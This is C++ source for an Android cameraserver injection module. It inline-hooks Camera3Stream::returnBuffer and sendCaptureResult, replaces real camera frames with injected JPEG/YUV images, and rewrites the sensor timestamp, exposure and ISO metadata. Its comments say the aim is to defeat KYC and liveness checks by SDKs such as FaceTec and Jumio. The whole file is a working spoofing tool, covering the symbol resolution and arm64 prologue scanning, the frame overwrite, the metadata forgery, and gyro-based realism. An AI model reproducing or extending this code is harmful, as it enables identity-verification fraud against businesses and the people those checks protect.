// Camera3Stream::returnBuffer  (AOSP android-13/14, arm64 ABI) — the public
// base-class method: it locks, calls returnBufferLocked, fires listeners, then
// queues the filled buffer to the consumer Surface. We run before that queue,
// so overwriting the dmabuf here is what the consumer actually receives.
// status_t returnBuffer(const camera_stream_buffer &buf,
//                       nsecs_t ts, nsecs_t readoutTs,
//                       bool tsIncreasing,
//                       const std::vector<size_t> &surface_ids,
//                       uint64_t frameNumber, int32_t transform)
// Registers: x0=this  x1=&buf  x2=ts  x3=readoutTs  x4=tsIncreasing
//            x5=&surface_ids  x6=frameNumber  x7=transform

typedef int (*orig_return_buffer_t)(void*, const cam_stream_buf*, int64_t,
                                    int64_t, bool, void*, uint64_t, int32_t);

static int hook_return_buffer(void *thiz, const cam_stream_buf *buf,
                               int64_t ts, int64_t readoutTs,
                               bool tsInc, void *sids,
                               uint64_t frameNum, int32_t xform) {
    if (inject_enabled() && buf && buf->stream &&
        buf->buffer && *buf->buffer &&
        (*buf->buffer)->numFds > 0) {

        stream_t *s = buf->stream;
        bool is_blob = (s->format == 33);                    // HAL_PIXEL_FORMAT_BLOB
        bool is_yuv  = (s->format == 35 || s->format == 17  // YCbCr_420_888 / YCrCb_420_SP
                        || s->format == 842094169);          // YV12

        // Camera-facing gate: inject only the facing the user targets (ctrl_cam);
        // the other camera passes through. Default target is back, so the front
        // camera passes through until the user switches (volume-up double-press).
        // When the active facing is unknown (daemon not providing cur_cam) we
        // don't block — the tool behaves as before.
        int target = cam_target();          // 0=back, 1=front, 2=both
        int cur    = cam_current();          // 0=back, 1=front, -1=unknown
        bool facing_ok = (target == 2) || (cur < 0) || (cur == target);

        // YUV injection requires explicit opt-in via ctrl_yuv (width threshold).
        uint32_t yuv_thresh = is_yuv ? yuv_min_width() : 0;
        bool should_inject  = facing_ok &&
            (is_blob || (is_yuv && yuv_thresh > 0 && s->width >= yuv_thresh));

        if (is_blob)
            LOGD("returnBuffer BLOB: fmt=%d %ux%u numFds=%d facing_ok=%d should_inject=%d (target=%d cur=%d)",
                 s->format, s->width, s->height, (*buf->buffer)->numFds, facing_ok, should_inject, target, cur);

        if (should_inject) {
            native_handle_t *nh = *buf->buffer;
            int dmabuf_fd = nh->data[0];
            if (is_blob) {
                write_blob(dmabuf_fd, slot_jpeg(), (int)s->width, (int)s->height);
            } else {
                char yuvp[160], dimp[160];
                slot_yuv_paths(yuvp, dimp, sizeof(yuvp));
                uint32_t stride = gralloc_row_stride(nh, s->width, s->height);
                write_yuv(dmabuf_fd, s->width, s->height, stride, yuvp, dimp, frameNum);
                // Diagnostic: log the injected slot/file + dims on every slot change
                // and periodically, so we can see WHICH media is fed and at what rate
                // (continuous => Jumio pulls a stream/clip; the path shows the slot).
                static char last_yuv[160] = {};
                static unsigned yuv_ctr = 0;
                yuv_ctr++;
                if (strcmp(yuvp, last_yuv) != 0 || (yuv_ctr % 60) == 0) {
                    LOGD("write_yuv #%u: %ux%u stride=%u path=%s", yuv_ctr, s->width, s->height, stride, yuvp);
                    strncpy(last_yuv, yuvp, sizeof(last_yuv) - 1);
                }
            }
            bump_stats();
        }
    }

    return ((orig_return_buffer_t)g_trampoline)(thiz, buf, ts, readoutTs,
                                                tsInc, sids, frameNum, xform);
}

// ─── Camera3Device::sendCaptureResult hook (Step 2) ───────────────────────
//
// AOSP signature (frameworks/av/services/camera/libcameraservice/device3/Camera3Device.h):
//   void Camera3Device::sendCaptureResult(
//       const CameraMetadata &pendingMetadata,          // x1
//       CaptureResultExtras   &resultExtras,            // x2
//       CameraMetadata        &collectedPartialResult,  // x3
//       uint32_t               frameNumber,             // w4
//       bool                   reprocess,               // w5
//       bool                   zslStillCapture,         // w6
//       bool                   rotateAndCropAuto,       // w7
//       const std::set<std::string> & cameraIdsWithZoom,       // stack
//       const std::vector<PhysicalCaptureResultInfo>& physicalMetadatas); // stack
//
// CameraMetadata layout (frameworks/av/camera/include/CameraMetadata.h):
//   class CameraMetadata {
//       camera_metadata_t *mBuffer;    // offset 0
//       mutable bool       mLocked;
//   };
// So *(camera_metadata_t**)(&pendingMetadata) == the raw buffer.
typedef void (*orig_scr_t)(void *, const void *, void *, void *,
                           uint32_t, bool, bool, bool, const void *, const void *);

static void hook_send_capture_result(void *thiz,
                                     const void *pendingMetadata,
                                     void *resultExtras,
                                     void *collectedPartialResult,
                                     uint32_t frameNumber,
                                     bool reprocess, bool zslStillCapture,
                                     bool rotateAndCropAuto,
                                     const void *cameraIdsWithZoom,
                                     const void *physicalMetadatas) {
    // Extract real per-frame metadata and park it in the ring.  Non-fatal if
    // the C API isn't available or the buffer is empty — we still chain to
    // the original.  Writer side of the seqlock: bump odd, write, bump even.
    if (g_find_ro && pendingMetadata) {
        // CameraMetadata inherits from Parcelable (virtual destructor) so the
        // object's first 8 bytes are a vtable pointer. mBuffer is the FIRST
        // data member after the vtable:
        //   offset 0 : vtable*
        //   offset 8 : camera_metadata_t *mBuffer
        //   offset 16: bool mLocked
        const camera_metadata_t *raw =
            *(const camera_metadata_t * const *)((const uint8_t *)pendingMetadata + 8);
        if (raw) {
            FrameMeta *s = meta_slot(frameNumber);
            uint32_t next = s->seq + 1;              // make odd (writer in progress)
            s->seq = next;
            __asm__ volatile("dmb ish" ::: "memory"); // barrier so readers see odd first

            s->frame_number = frameNumber;
            s->valid_mask   = 0;

            cm_ro_entry e;
            if (g_find_ro(raw, TAG_SENSOR_TIMESTAMP, &e) == 0 && e.count > 0 && e.data.i64) {
                s->timestamp_ns = (uint64_t)e.data.i64[0];
                s->valid_mask  |= 1u;
            }
            if (g_find_ro(raw, TAG_EXPOSURE_TIME, &e) == 0 && e.count > 0 && e.data.i64) {
                s->exposure_ns  = (uint64_t)e.data.i64[0];
                s->valid_mask  |= 2u;
            }
            if (g_find_ro(raw, TAG_SENSITIVITY, &e) == 0 && e.count > 0 && e.data.i32) {
                s->iso          = (uint32_t)e.data.i32[0];
                s->valid_mask  |= 4u;
            }
            // AWB: try real GAINS first (apps that lock AWB populate this);
            // fallback to the 3×3 COLOR_CORRECTION_TRANSFORM diagonal — this
            // is populated even under AUTO-AWB on most devices and gives a
            // reasonable pseudo-gain per channel. Both paths set mask bit 3.
            if (g_find_ro(raw, TAG_CC_GAINS, &e) == 0 && e.count >= 4 && e.data.f) {
                s->awb_gains[0] = e.data.f[0];
                s->awb_gains[1] = e.data.f[1];
                s->awb_gains[2] = e.data.f[2];
                s->awb_gains[3] = e.data.f[3];
                s->valid_mask  |= 8u;
            } else if (g_find_ro(raw, TAG_CC_TRANSFORM, &e) == 0 && e.count >= 9 && e.data.raw) {
                // 3×3 row-major rationals; diagonal = R→R, G→G, B→B channel
                // scales, close enough to per-channel AWB gains for our
                // chroma-shift purpose.
                const camera_metadata_rational *m =
                    (const camera_metadata_rational *)e.data.raw;
                auto rat = [](const camera_metadata_rational &r) -> float {
                    return r.denominator != 0 ? (float)r.numerator / (float)r.denominator : 1.0f;
                };
                float R = rat(m[0]);                 // row 0, col 0
                float G = rat(m[4]);                 // row 1, col 1
                float B = rat(m[8]);                 // row 2, col 2
                s->awb_gains[0] = R;
                s->awb_gains[1] = G;
                s->awb_gains[2] = G;                 // G_odd ≈ G_even approximation
                s->awb_gains[3] = B;
                s->valid_mask  |= 8u;
            }
            // ALSO stash the full 3×3 CCM (whether or not it was the fallback
            // path above) — we use it in composite_yuv for the exact per-pixel
            // WB+CCM YUV→YUV transform instead of the coarse mean shift.
            if (g_find_ro(raw, TAG_CC_TRANSFORM, &e) == 0 && e.count >= 9 && e.data.raw) {
                const camera_metadata_rational *m =
                    (const camera_metadata_rational *)e.data.raw;
                for (int k = 0; k < 9; k++) {
                    s->ccm[k] = m[k].denominator != 0
                        ? (float)m[k].numerator / (float)m[k].denominator
                        : ((k == 0 || k == 4 || k == 8) ? 1.0f : 0.0f);
                }
                s->valid_mask |= 0x20u;
            }
            // Per-frame focal length → per-frame hfov (Step-4 motion blur).
            // Stored in mm; pixel conversion is  f_px = src_w · focal / sensor_w.
            if (g_find_ro(raw, TAG_LENS_FOCAL_LEN, &e) == 0 && e.count > 0 && e.data.f) {
                s->focal_length_mm = e.data.f[0];
                s->valid_mask    |= 0x10u;
            }

            __asm__ volatile("dmb ish" ::: "memory");
            s->seq = next + 1;                       // even again (writer done)

            // ── Metadata spoof ──────────────────────────────────────────────
            // FaceTec / other KYC SDKs cross-check the injected image against
            // the Camera2 CaptureResult metadata. The real metadata (timestamp,
            // exposure, ISO) reflects the physical sensor, not our injected
            // frame, so we overwrite the key entries in-place with values
            // consistent with the injected content. Uses the libcamera_metadata
            // update API so the buffer stays well-formed.
            if (inject_enabled()) {
                // Resolve the update function lazily (once).
                static void (*g_update_entry)(camera_metadata_t *, camera_metadata_entry_t *,
                                             uint32_t, const void *, size_t *) = nullptr;
                static bool resolved = false;
                if (!resolved) {
                    void *h = dlopen("libcamera_metadata.so", RTLD_NOW | RTLD_NOLOAD);
                    if (h) g_update_entry = (void(*)(camera_metadata_t*, camera_metadata_entry_t*, uint32_t, const void*, size_t*))
                        dlsym(h, "update_camera_metadata_entry");
                    if (!g_update_entry) g_update_entry = (void(*)(camera_metadata_t*, camera_metadata_entry_t*, uint32_t, const void*, size_t*))
                        dlsym(RTLD_DEFAULT, "update_camera_metadata_entry");
                    resolved = true;
                }
                // Resolve find_camera_metadata_entry (writable version) lazily.
            static int (*g_find_entry)(camera_metadata_t *, uint32_t, camera_metadata_entry_t *) = nullptr;
            static bool find_resolved = false;
            if (!find_resolved) {
                void *h = dlopen("libcamera_metadata.so", RTLD_NOW | RTLD_NOLOAD);
                if (h) g_find_entry = (int(*)(camera_metadata_t*, uint32_t, camera_metadata_entry_t*))
                    dlsym(h, "find_camera_metadata_entry");
                if (!g_find_entry) g_find_entry = (int(*)(camera_metadata_t*, uint32_t, camera_metadata_entry_t*))
                    dlsym(RTLD_DEFAULT, "find_camera_metadata_entry");
                find_resolved = true;
            }

            if (g_update_entry && g_find_entry) {
                camera_metadata_entry_t entry;
                // Spoof SENSOR_TIMESTAMP: monotonically increasing per frame
                if (g_find_entry((camera_metadata_t *)raw, TAG_SENSOR_TIMESTAMP, &entry) == 0) {
                    uint64_t spoof_ts = (uint64_t)frameNumber * 33333333ULL;
                    size_t dsz = sizeof(uint64_t);
                    g_update_entry((camera_metadata_t *)raw, &entry, 1, &spoof_ts, &dsz);
                }
                    // Spoof SENSOR_EXPOSURE_TIME: fixed reasonable value
                    if (g_find_entry((camera_metadata_t *)raw, TAG_EXPOSURE_TIME, &entry) == 0) {
                        uint64_t spoof_exp = 10000000ULL; // 10 ms
                        size_t dsz = sizeof(uint64_t);
                        g_update_entry((camera_metadata_t *)raw, &entry, 1, &spoof_exp, &dsz);
                    }
                    // Spoof SENSOR_SENSITIVITY (ISO): fixed reasonable value
                    if (g_find_entry((camera_metadata_t *)raw, TAG_SENSITIVITY, &entry) == 0) {
                        int32_t spoof_iso = 200;
                        size_t dsz = sizeof(int32_t);
                        g_update_entry((camera_metadata_t *)raw, &entry, 1, &spoof_iso, &dsz);
                    }
                }

            // Low-rate log (every 60 frames so we don't flood logcat)
            if ((frameNumber % 60) == 0) {
                // Step-3 sanity: slice the gyro window covering this frame's
                // shutter interval and report sample count + mean |ω|. Phone
                // at rest should show |ω| < 0.02 rad/s; a shake > 0.3 rad/s.
                ImuSample win[32];
                int nw = 0;
                float mag = 0.f;
                if (g_imu_hdr && s->timestamp_ns && s->exposure_ns) {
                    uint64_t t_end = s->timestamp_ns;
                    uint64_t t_start = (s->exposure_ns < t_end) ? t_end - s->exposure_ns : 0;
                    nw = imu_window(t_start, t_end, win, 32);
                    for (int i = 0; i < nw; i++) {
                        float x = win[i].x, y = win[i].y, z = win[i].z;
                        float m2 = x*x + y*y + z*z;
                        // sqrtf from libm (already NEEDED) — the hand-rolled
                        // Newton from m=m2 was converging terribly for
                        // sub-rad values, falsely reporting 0.063 when the
                        // real magnitude was 0.01.
                        float m = __builtin_sqrtf(m2);
                        mag += m;
                    }
                    if (nw > 0) mag /= nw;
                }
                LOGD("meta fn=%u ts=%lluns exp=%lluns iso=%u gains=%.2f,%.2f,%.2f,%.2f mask=0x%x  imu_win=%d |w|=%.3f",
                     frameNumber, (unsigned long long)s->timestamp_ns,
                     (unsigned long long)s->exposure_ns, s->iso,
                     s->awb_gains[0], s->awb_gains[1], s->awb_gains[2], s->awb_gains[3],
                     s->valid_mask, nw, mag);
            }
        }
    }
    ((orig_scr_t)g_scr_trampoline)(thiz, pendingMetadata, resultExtras,
                                   collectedPartialResult, frameNumber,
                                   reprocess, zslStillCapture, rotateAndCropAuto,
                                   cameraIdsWithZoom, physicalMetadatas);
}

// ─── ELF symbol finder (reads lib from disk, tolerates stripped section hdrs) ─

static bool find_func_by_substr(const char *lib_name, const char *needle,
                                 void **out_fn) {
    // 1. Find load base in /proc/self/maps
    FILE *mf = fopen("/proc/self/maps", "r");
    if (!mf) return false;

    char line[512];
    uintptr_t lib_base = 0;
    char lib_path[256] = {};

    while (fgets(line, sizeof(line), mf)) {
        char perms[8], path[256] = {};
        uint64_t start;
        if (sscanf(line, "%lx-%*lx %4s %*x %*x:%*x %*u %255s",
                   &start, perms, path) == 3) {
            const char *bn = strrchr(path, '/');
            bn = bn ? bn + 1 : path;
            if (strstr(bn, lib_name) && perms[2] == 'x' && lib_base == 0) {
                lib_base = (uintptr_t)start;
                strncpy(lib_path, path, sizeof(lib_path) - 1);
            }
        }
    }
    fclose(mf);
    if (!lib_base) return false;

    // 2. Read ELF from disk
    int fd = open(lib_path, O_RDONLY);
    if (fd < 0) return false;
    struct stat st;
    fstat(fd, &st);
    void *elf_data = mmap(NULL, (size_t)st.st_size,
                          PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (elf_data == MAP_FAILED) return false;

    bool found = false;
    auto *ehdr = (Elf64_Ehdr *)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, 4) != 0) goto done;

    {
        auto *phdrs = (Elf64_Phdr *)((uint8_t *)elf_data + ehdr->e_phoff);

        // ELF virtual base (first PT_LOAD p_vaddr)
        uintptr_t elf_vbase = 0;
        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdrs[i].p_type == PT_LOAD) { elf_vbase = phdrs[i].p_vaddr; break; }
        }

        // Find .dynsym / .dynstr via section headers (present on system libs)
        if (ehdr->e_shoff != 0 && ehdr->e_shnum > 0) {
            auto *shdrs = (Elf64_Shdr *)((uint8_t *)elf_data + ehdr->e_shoff);
            const char *shstr =
                (const char *)((uint8_t *)elf_data +
                               shdrs[ehdr->e_shstrndx].sh_offset);

            const Elf64_Sym *symtab = nullptr;
            size_t sym_count = 0;
            const char *strtab = nullptr;

            for (int i = 0; i < ehdr->e_shnum; i++) {
                const char *sname = shstr + shdrs[i].sh_name;
                if (shdrs[i].sh_type == SHT_DYNSYM &&
                    strcmp(sname, ".dynsym") == 0) {
                    symtab    = (const Elf64_Sym *)((uint8_t *)elf_data + shdrs[i].sh_offset);
                    sym_count = shdrs[i].sh_size / sizeof(Elf64_Sym);
                }
                if (shdrs[i].sh_type == SHT_STRTAB &&
                    strcmp(sname, ".dynstr") == 0) {
                    strtab = (const char *)((uint8_t *)elf_data + shdrs[i].sh_offset);
                }
            }

            if (symtab && strtab) {
                for (size_t i = 0; i < sym_count; i++) {
                    if (ELF64_ST_TYPE(symtab[i].st_info) != STT_FUNC) continue;
                    if (symtab[i].st_value == 0) continue;
                    const char *sname = strtab + symtab[i].st_name;
                    if (strstr(sname, needle) && !strstr(sname, "Locked")) {
                        uintptr_t va = symtab[i].st_value;
                        *out_fn = (void *)(lib_base - elf_vbase + va);
                        LOGD("found [section] %s at %p", sname, *out_fn);
                        found = true;
                        break;
                    }
                }
            }
        }

        // Fallback: use DT_HASH + DT_SYMTAB in PT_DYNAMIC (no section headers needed)
        if (!found) {
            for (int i = 0; i < ehdr->e_phnum && !found; i++) {
                if (phdrs[i].p_type != PT_DYNAMIC) continue;
                auto *dyn = (Elf64_Dyn *)((uint8_t *)elf_data + phdrs[i].p_offset);

                const Elf64_Sym *symtab = nullptr;
                const char *strtab = nullptr;
                uint32_t *hash_tbl = nullptr;  // SysV hash: [nbucket, nchain, ...]

                while (dyn->d_tag != DT_NULL) {
                    // d_un.d_ptr here are file-relative VAs; map to elf_data offset
                    if (dyn->d_tag == DT_SYMTAB)
                        symtab  = (const Elf64_Sym *)((uint8_t *)elf_data +
                                  dyn->d_un.d_ptr - elf_vbase);
                    if (dyn->d_tag == DT_STRTAB)
                        strtab  = (const char *)((uint8_t *)elf_data +
                                  dyn->d_un.d_ptr - elf_vbase);
                    if (dyn->d_tag == DT_HASH)
                        hash_tbl = (uint32_t *)((uint8_t *)elf_data +
                                   dyn->d_un.d_ptr - elf_vbase);
                    dyn++;
                }

                // SysV DT_HASH path
                if (symtab && strtab && hash_tbl) {
                    uint32_t nchain = hash_tbl[1];
                    for (uint32_t j = 0; j < nchain && !found; j++) {
                        if (ELF64_ST_TYPE(symtab[j].st_info) != STT_FUNC) continue;
                        if (symtab[j].st_value == 0) continue;
                        const char *sname = strtab + symtab[j].st_name;
                        if (strstr(sname, needle) && !strstr(sname, "Locked")) {
                            *out_fn = (void *)(lib_base - elf_vbase + symtab[j].st_value);
                            LOGD("found [sysv_hash] %s at %p", sname, *out_fn);
                            found = true;
                        }
                    }
                }

                // GNU hash (DT_GNU_HASH) path — AOSP release libs ship with this only
                if (!found && symtab && strtab) {
                    // Scan dynamic segment again for DT_GNU_HASH
                    auto *dyn2 = (Elf64_Dyn *)((uint8_t *)elf_data + phdrs[i].p_offset);
                    uint32_t *gnu = nullptr;
                    while (dyn2->d_tag != DT_NULL) {
                        if (dyn2->d_tag == DT_GNU_HASH)
                            gnu = (uint32_t *)((uint8_t *)elf_data +
                                              dyn2->d_un.d_ptr - elf_vbase);
                        dyn2++;
                    }
                    if (gnu) {
                        // Layout: [nbuckets][symndx][bloom_size][bloom_shift]
                        //         [bloom[bloom_size]][buckets[nbuckets]][chains...]
                        uint32_t nbuckets  = gnu[0];
                        uint32_t symndx    = gnu[1];
                        uint32_t bloom_sz  = gnu[2];
                        uint32_t *buckets  = gnu + 4 + bloom_sz;
                        uint32_t *chains   = buckets + nbuckets;

                        // Find highest-index bucket to bound the symbol range
                        uint32_t max_sym = symndx;
                        for (uint32_t k = 0; k < nbuckets; k++)
                            if (buckets[k] > max_sym) max_sym = buckets[k];

                        // Walk that chain to find the last symbol index
                        uint32_t last_sym = max_sym;
                        if (max_sym >= symndx) {
                            uint32_t *c = chains + (max_sym - symndx);
                            while (!(*c & 1)) { c++; last_sym++; }
                        }

                        for (uint32_t j = symndx; j <= last_sym && !found; j++) {
                            if (ELF64_ST_TYPE(symtab[j].st_info) != STT_FUNC) continue;
                            if (symtab[j].st_value == 0) continue;
                            const char *sname = strtab + symtab[j].st_name;
                            if (strstr(sname, needle) && !strstr(sname, "Locked")) {
                                *out_fn = (void *)(lib_base - elf_vbase + symtab[j].st_value);
                                LOGD("found [gnu_hash] %s at %p", sname, *out_fn);
                                found = true;
                            }
                        }
                    }
                }
            }
        }
    }

done:
    munmap(elf_data, (size_t)st.st_size);
    return found;
}

// ─── Signature-free resolver: find a function via a string it references ──────
//
// Needed because on some builds (e.g. Pixel 7a A14) libcameraservice is STATICALLY
// linked into a stripped /system/bin/cameraserver: returnBuffer is in no symbol
// table. We instead locate a unique string the function logs, find the ADRP+ADD
// that materialises the string's address, and walk back to the function prologue
// (stp x29,x30,[sp,#-N]!). Robust across rebuilds — no hardcoded offsets.
//
// Anchor: the __func__ string of Camera3Stream::returnBuffer. A C++ __FUNCTION__
// constant is referenced ONLY from within its own function (its ALOGx calls),
// so it pinpoints the buffer-RETURN entry exactly. We match it together with its
// NUL terminator so "returnBuffer" cannot collide with the longer symbols
// returnBufferLocked / returnBufferCheckedLocked / returnBufferPreconditionCheckLocked.
#define RB_ANCHOR "returnBuffer"

static bool find_func_by_string_anchor(const char *module_substr,
                                       const char *anchor, void **out_fn) {
    FILE *mf = fopen("/proc/self/maps", "r");
    if (!mf) return false;

    // Collect the module's executable range and its read-only (rodata) ranges.
    uintptr_t rx_lo = 0, rx_hi = 0;
    uintptr_t ro[8][2]; int nro = 0;
    char line[512];
    while (fgets(line, sizeof(line), mf)) {
        char perms[8] = {}, path[256] = {};
        uint64_t s, e;
        if (sscanf(line, "%lx-%lx %7s %*x %*x:%*x %*u %255s", &s, &e, perms, path) < 3)
            continue;
        const char *bn = strrchr(path, '/'); bn = bn ? bn + 1 : path;
        if (!strstr(bn, module_substr)) continue;
        if (perms[2] == 'x') { if (!rx_lo) rx_lo = (uintptr_t)s; rx_hi = (uintptr_t)e; }
        else if (perms[0] == 'r' && perms[1] == '-' && perms[2] == '-' && nro < 8) {
            ro[nro][0] = (uintptr_t)s; ro[nro][1] = (uintptr_t)e; nro++;
        }
    }
    fclose(mf);
    if (!rx_lo || nro == 0) return false;

    // 1. Find the anchor string's runtime address in a read-only mapping.
    size_t alen = strlen(anchor);
    uintptr_t str_at = 0;
    for (int i = 0; i < nro && !str_at; i++) {
        for (uintptr_t p = ro[i][0]; p + alen + 1 < ro[i][1]; p++) {
            // Match the whole C string including its NUL, so a short anchor can't
            // land on a longer string that merely starts with it.
            if (memcmp((const void *)p, anchor, alen) == 0 &&
                ((const char *)p)[alen] == '\0') { str_at = p; break; }
        }
    }
    if (!str_at) return false;

    // 2. Scan .text for ADRP(page of str_at) + ADD(low bits) into the same reg,
    //    then walk back to the nearest  stp x29,x30,[sp,#-N]!  prologue. The ADD
    //    must closely follow its ADRP (same basic block) to avoid a stale-register
    //    false match far from the real string reference.
    uintptr_t adrp_page[32] = {0}, adrp_at[32] = {0};
    for (uintptr_t pc = rx_lo; pc + 4 <= rx_hi; pc += 4) {
        uint32_t w = *(const uint32_t *)pc;
        if ((w & 0x9F000000) == 0x90000000) {              // ADRP Xd, page
            uint32_t rd = w & 0x1F;
            int64_t imm = (int64_t)(((w >> 5) & 0x7FFFF) << 2) | ((w >> 29) & 0x3);
            if (imm & (1LL << 20)) imm -= (1LL << 21);     // sign-extend 21 bits
            adrp_page[rd] = (pc & ~0xFFFULL) + ((uintptr_t)imm << 12);
            adrp_at[rd]   = pc;
        } else if ((w & 0xFFC00000) == 0x91000000) {        // ADD Xd, Xn, #imm12
            uint32_t rd = w & 0x1F, rn = (w >> 5) & 0x1F;
            uint32_t imm12 = (w >> 10) & 0xFFF;
            if (((w >> 22) & 0x3) == 1) imm12 <<= 12;
            if (adrp_page[rn] && adrp_at[rn] && (pc - adrp_at[rn]) <= 0x20 &&
                adrp_page[rn] + imm12 == str_at) {
                for (uintptr_t q = pc; q >= rx_lo && q + 0x400 > pc; q -= 4) {
                    uint32_t ins = *(const uint32_t *)q;
                    // Two common arm64 function prologues that save x29,x30:
                    //  (a) stp x29,x30,[sp,#-N]!   pre-index  — 0xA980 7BFD
                    //  (b) stp x29,x30,[sp,#N]     signed-off — 0xA900 7BFD
                    //      (usually preceded by  sub sp,sp,#N  — tolerated)
                    if ((ins & 0xFFC07FFFu) == 0xA9807BFDu ||
                        (ins & 0xFFC07FFFu) == 0xA9007BFDu) {
                        // For form (b), the real function entry is the
                        // preceding `sub sp, sp, #imm12` (Rn=Rd=SP=31).
                        uintptr_t entry = q;
                        if ((ins & 0xFFC07FFFu) == 0xA9007BFDu && q - 4 >= rx_lo) {
                            uint32_t pr = *(const uint32_t *)(q - 4);
                            // SUB (immediate), sf=1, Rn=11111 (SP), Rd=11111 (SP)
                            if ((pr & 0xFF8003FFu) == 0xD10003FFu) entry = q - 4;
                        }
                        *out_fn = (void *)entry;
                        LOGD("found [str-anchor] fn at %p (via %p)", *out_fn, (void *)pc);
                        return true;
                    }
                }
            }
            if (rd == rn) { adrp_page[rd] = 0; adrp_at[rd] = 0; }  // reg consumed
        }
    }
    return false;
}

// ─── Constructor ──────────────────────────────────────────────────────────

__attribute__((constructor)) static void cam_hook_init() {
    init_session_jitter();   // seed before any composite can fire
    LOGD("cam_hook_init: searching returnBuffer in libcameraservice.so");

    void *target = nullptr;

    // returnBuffer is Camera3Stream::returnBuffer (base class), mangled e.g.
    // _ZN7android13Camera3Stream12returnBufferERK...  — NOT Camera3OutputStream,
    // which only overrides returnBufferLocked (rejected by the "Locked" guard).
    // Match on the "returnBuffer" fragment; the second pass uses the Itanium
    // length-prefixed "12returnBuffer" to disambiguate.
    // NOTE: all three lookup paths read only the DYNAMIC symbol table; this
    // relies on returnBuffer being exported in .dynsym (verify on-device with
    // `readelf --dyn-syms libcameraservice.so | grep returnBuffer`).
    bool ok = find_func_by_substr("libcameraservice", "returnBuffer", &target);
    if (!ok || !target) {
        // Some AOSP builds mangle differently; try shorter fragment
        ok = find_func_by_substr("libcameraservice", "12returnBuffer", &target);
    }
    if (!ok || !target) {
        // No libcameraservice.so and/or stripped symbols: resolve by string
        // anchor in the cameraserver executable (returnBuffer statically linked).
        ok = find_func_by_string_anchor("cameraserver", RB_ANCHOR, &target);
    }
    if (!ok || !target) {
        LOGW("cam_hook_init: returnBuffer not found — hook inactive");
        return;
    }

    if (!inline_hook(target, (void *)hook_return_buffer, &g_trampoline)) {
        LOGW("cam_hook_init: inline_hook failed at %p", target);
        return;
    }

    LOGD("cam_hook_init: hook installed at %p, trampoline=%p",
         target, g_trampoline);

    // Step 2: install the capture-result metadata hook so the compositor can
    // see real per-frame exposure/sensitivity/timestamp/AWB-gains for the
    // exact frame it's about to overwrite. Non-fatal if any piece fails —
    // the Step-1 compositor keeps running with its coarse spatial estimate.
    //
    // 1) Resolve find_camera_metadata_ro_entry from libcamera_metadata.so
    //    (already loaded by cameraserver — opened without RTLD_GLOBAL so it
    //    stays its own namespace).  dlsym against RTLD_DEFAULT picks it up.
    void *h = dlopen("libcamera_metadata.so", RTLD_NOW | RTLD_NOLOAD);
    if (h) {
        g_find_ro = (find_ro_t)dlsym(h, "find_camera_metadata_ro_entry");
    }
    if (!g_find_ro) g_find_ro = (find_ro_t)dlsym(RTLD_DEFAULT, "find_camera_metadata_ro_entry");
    if (!g_find_ro) {
        LOGW("cam_hook_init: find_camera_metadata_ro_entry unavailable — Step 2 off");
        return;
    }

    // 2) Anchor sendCaptureResult by its __FUNCTION__ string ("sendCaptureResult").
    //    On lynx/AP1A.240405.002 this lands at the signed-offset STP prologue
    //    the scanner now recognises (see find_func_by_string_anchor extension).
    void *scr_target = nullptr;
    if (!find_func_by_string_anchor("cameraserver", "sendCaptureResult", &scr_target) ||
        !scr_target) {
        LOGW("cam_hook_init: sendCaptureResult not located — Step 2 off");
        return;
    }
    if (!inline_hook(scr_target, (void *)hook_send_capture_result, &g_scr_trampoline)) {
        LOGW("cam_hook_init: inline_hook(sendCaptureResult) failed at %p", scr_target);
        return;
    }
    LOGD("cam_hook_init: sendCaptureResult hook installed at %p, trampoline=%p",
         scr_target, g_scr_trampoline);

    // Step 3: open the gyro shared ring (daemon fills it at ~200 Hz). Non-
    // fatal — Step-4 motion blur just no-ops if imu_open() fails or the
    // daemon isn't streaming yet.
    if (!imu_open()) {
        LOGW("cam_hook_init: imu.shm unavailable — motion blur will no-op");
    }
}
